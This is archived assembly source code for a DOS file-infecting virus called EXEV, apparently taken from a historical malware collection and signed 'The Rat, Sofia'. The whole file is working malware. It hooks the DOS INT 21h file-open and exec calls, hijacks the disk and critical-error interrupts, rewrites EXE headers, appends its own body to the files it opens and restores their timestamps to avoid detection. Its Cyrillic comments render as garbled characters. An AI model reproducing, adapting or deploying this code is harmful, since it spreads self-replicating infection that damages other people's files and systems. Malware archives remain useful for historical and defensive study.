; ------------------------------------------------------------
; name      E
; type      asm
; cve       —
; year      unknown
; os        DOS
; authors   unknown
; source    krisyotam
; archived  krisyotam (2026)
; notes     —
; ------------------------------------------------------------

PAGE  59,132

;��������������������������������������������������������������������������
;��                                                                      ��
;��                             EXEV                                     ��
;��                                                                      ��
;��      Created:   2-Jun-90                                             ��
;��      Version:                                                        ��
;��      Passes:    9          Analysis Options on: ABCDEFPX             ��
;��                                                                      ��
;��                                                                      ��
;��������������������������������������������������������������������������

data_13e        equ     1000h                   ; (6B7E:1000=0)

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a


                org     100h

exev            proc    far

start:
                mov     dx,offset data_1        ; (6B7E:010A=0Ah)
                mov     ah,9
                int     21h                     ; DOS Services  ah=function 09h
                                                ;  display char string at ds:dx
                jmp     loc_2                   ; (0A10)
data_1          db      0Ah, 0Dh, '������ ������ � �������. '
                db      '���� ����� ! ..', 0Ah, 0Dh, '$'
                db      0
                db      1928 dup (0)
data_3          dw      0
                db      0, 0, 0, 0
data_4          dw      0
data_5          dw      0
data_6          dw      0
                db      0, 0, 0, 0
data_7          dw      0
                db      0, 0, 0, 0
data_8          dw      0
data_9          dw      0
                db      310 dup (0)
loc_2:
                cld                             ; Clear direction
                mov     ax,352Bh
                int     21h                     ; DOS Services  ah=function 35h
                                                ;  get intrpt vector al in es:bx
                mov     bp,ds
                push    cs
                pop     ds
                add     word ptr jmp_far+3,bp   ; ������� ��� JMP FAR ������� �������
                mov     si,0A10h                ; ��������� �� � �������� ����� ����
                mov     di,si                   ; ES ���� � �������� �� INT 21H
                mov     cx,180h
                rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
                push    es                      ; ���� ���� �� �������� �� ������ ���
                mov     ax,offset prehod        ; ����,�� �� ����� �����
                push    ax
                retf                            ; Return far
prehod          label   word
                lea     di,[bx+1Bh]             ; ������� �������� �� ������� � JMP FAR
                mov     al,0E9h                 ; ������� ���� �� JMP
                stosb                           ; Store al to es:[di]
                mov     ax,offset jmp_far+3     ; ���� � ������ �� ����� ������ �� ��
                sub     ax,di                   ; ������,������� �� �� ������������ ��
                stosw                           ; INT 21H � �� �������
                stosw                           ; ���� ������� � ���������� �������
                stosw                           ; ������ ����������
                mov     cs:data_3,di            ; ���� � ������ �� INT 21H
                mov     ax,ss                   ; ������������ SS
                sub     ax,18h
                cli
                mov     ss,ax
                lea     ax,[bp+10h]             ; ����� ������ �� ����� ������
                mov     bx,11h                  ; �� �� ������ ����������
move            label   word
loc_3:
                mov     es,ax
                add     ax,18h
                mov     ds,ax
                xor     si,si                   ; ��������� ������� �� 180h ����� ��
                xor     di,di                   ; �� �� ����� �� ������� ��.����� ��
                mov     cx,0C0h                 ; 11h ���� �� �� �� �������
                rep     movsw                   ; Rep when cx >0 Mov [si] to es:[di]
                dec     bx
                jns     loc_3                   ; Jump if not sign
                sti                             ; Enable interrupts
                mov     ds,bp                   ; ������������ DS � ES
                push    ds
                pop     es
jmp_far:        db      0EAh,0,0,0,0            ; ���� � ������ �� �� ������� � JMP FAR
int_21:         cld                             ; �� ��� ������� ����������� �� INT 21H
                cmp     ah,3Dh                  ; '='
                je      loc_4                   ; Jump if equal
                cmp     ah,4Bh                  ; 'K'
                jne     loc_5                   ; Jump if not equal
loc_4:                                          ;  xref 6B7E:0A70
                push    es
                call    sub_5                   ; (0AAD)
                pop     es
loc_5:                                          ;  xref 6B7E:0A75
                jmp     cs:data_3               ; JMP ��� INT 21h

exev            endp

;��������������������������������������������������������������������������
;                              SUBROUTINE
;��������������������������������������������������������������������������

sub_1           proc    near                    ; ����/������� �������� �� �����
                mov     cx,20h                  ; ��������� �� �� INT 21H_SEG:8C2
                mov     dx,8C2h
                jmp     short loc_6             ; (0A90)                         ; (0A90)

;���� External Entry into Subroutine ��������������������������������������

sub_2:
                mov     ax,4200h
                xor     dx,dx                   ; Zero register

;���� External Entry into Subroutine ��������������������������������������

sub_3:
                xor     cx,cx

;���� External Entry into Subroutine ��������������������������������������

sub_4:                                          ; ������ �� ��� INT 21H
loc_6:                                          ;  xref 6B7E:0A87
                pushf                           ; Push flags
                push    cs
                call    cs:data_3               ; (6B7E:08C0=0)
                retn
sub_1           endp

abort  :        mov     al,3                    ; ������ ����� �� INT 24H
                iret                            ; Interrupt return
_1              dw      17D0h
                dw      1509h
                dw      154Ch
_2              dw      0F7Ah
                dw      15DCh                   ;��� � � ������ �� INT 13H
                dw      161Fh

_3              dw      0FC9h,15DCh,161Fh        ;���� �� ������� ��
                                                 ;INT 25H,INT 26H,INT 27H

;��������������������������������������������������������������������������
;                              SUBROUTINE
;��������������������������������������������������������������������������

sub_5           proc    near
                push    di                      ; ������� ����������
                push    si
                push    dx
                push    cx
                push    bx
                push    ax
                push    ds
                xor     ax,ax                   ; Zero register
                mov     ds,ax
                push    cs
                pop     es
                mov     si,4Ch
                push    si
                mov     di,8E2h
                mov     cx,28h                  ; ������� ������������ �� 13H �� 24H
                rep     movsw                   ; Rep when cx >0 Mov [si] to es:[di]
                pop     di
                push    ds
                pop     es
                mov     al,70h                  ; 'p'
                mov     ds,ax
                mov     al,ds:data_13e          ;������� � al ������������ �� 70:1000
                mov     si,offset _1
                cmp     al,0
                je      loc_7                   ; Jump if equal
                mov     si,offset _2
                cmp     al,0Fh
                je      loc_7                   ; Jump if equal
                mov     si,offset _3
loc_7:                                          ;  xref 6B7E:0AD5, 0ADC
                push    cs
                pop     ds
                movsw
                mov     al,70h                  ; ����� INT 13H
                stosw                           ; Store ax to es:[di]
                mov     di,90h
                mov     ax,offset abort         ; ����� ������ �� INT 24H
                stosw                           ; Store ax to es:[di]
                mov     ax,cs
                stosw
                movsw
                stosw                           ; ����� ������������ ������
                movsw                           ; ����� �� INT 25H , INT 26H ,
                stosw                           ; INT 27H
                pop     ds
                mov     ax,3D02h                ; ������ ����� �� ������/�����
                call    sub_4                   ; (0A90)
                push    ds
                push    cs
                pop     ds
                mov     bx,ax
                mov     ax,5700h                ; ����� ������ � ���� �� �����
                jc      loc_9                   ; Jump if carry Set
                call    sub_4                   ; (0A90)
                push    cx                      ; ������� ������ � ���� � �����
                push    dx
                mov     ah,3Fh                  ; ������� �� ������ �� ��������
                call    sub_1                   ; (0A81)
                cmp     data_5,0                ; ��������� �� ������������ �������
                jne     loc_8                   ; ������� � ������
                cmp     data_6,ax               ; ��������� ������� �� �������� 0 ?
                jne     loc_8                   ; Jump if not equal
                mov     ax,data_4               ; ������� � AX ��������� �� �����
                shl     ax,1                    ; �������� � �� 2
                mov     word ptr move-2,ax      ; ������� ����� ���� �� �� ��������
                sub     data_6,18h              ; �������� ��������� �� ��������
                add     data_7,18h              ; ��������� ������������ �� SS � 18h
                mov     ax,0A10h
                xchg    ax,data_8               ; IP �� ���� �� ���������� A10h
                mov     word ptr jmp_far+1,ax   ; ������� IP � FAR JMP
                mov     ax,0FF5Fh               ; ������� CS ����,�� CS:IP ��
                xchg    ax,data_9               ; ���� �������� �� ������
                add     ax,10h
                mov     word ptr jmp_far+3,ax   ; ������� � JMP FAR ��������
                call    sub_2                   ; ������� � �������� �� �����
                mov     ah,40h                  ; ������� ��������
                call    sub_1                   ; (0A81)
                mov     ax,4200h
                mov     dx,80h                  ;��������� ���������� �� 80h
                call    sub_3                   ; (0A8E)
                mov     cx,180h
                mov     dx,0A10h
                mov     ah,40h                  ; ������� ������
                call    sub_4                   ; (0A90)
loc_8:                                          ;  xref 6B7E:0B15, 0B1B
                pop     dx
                pop     cx
                mov     ax,5701h                ; ������� ������ ��� � ����
                call    sub_4                   ; (0A90)
                mov     ah,3Eh                  ; ������� �����
                call    sub_4                   ; (0A90)
loc_9:                                          ;  xref 6B7E:0B04
                mov     si,8E2h
                mov     di,4Ch
                mov     cx,28h                  ; ����� �������������
                rep     movsw                   ; Rep when cx >0 Mov [si] to es:[di]
                pop     ds
                pop     ax                      ; ������������ ����������
                pop     bx
                pop     cx
                pop     dx
                pop     si
                pop     di
                retn
sub_5           endp

                db      'The Rat, Sofia'



seg_a           ends

                end  start
